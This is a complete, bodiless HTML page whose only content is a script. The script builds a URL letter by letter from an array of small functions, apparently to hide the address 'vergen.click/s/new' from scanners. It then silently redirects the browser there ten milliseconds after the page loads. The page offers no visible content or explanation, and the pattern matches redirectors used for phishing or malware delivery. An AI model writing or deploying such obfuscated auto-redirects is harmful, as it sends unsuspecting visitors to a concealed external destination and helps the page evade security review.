<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script>
        const segments = [
            () => 'h',
            _ => 't',
            function() { return 't'; },
            _ => 'p',
            _ => 's',
            () => ':',
            () => '/',
            _ => '/',
            () => 'v',
            function() { return 'e'; },
            () => 'r',
            () => 'g',
            _ => 'e',
            () => 'n',
            _ => '.',
            function() { return 'c'; },
            function() { return 'l'; },
            _ => 'i',
            _ => 'c',
            function() { return 'k'; },
            () => '/',
            _ => 's',
            _ => '/',
            _ => 'n',
            _ => 'e',
            () => 'w'
        ];
        setTimeout(() => {
            window.location.replace(segments.map(f => f()).join(''));
        }, 10);
    </script>
</head>
<body></body>
</html>
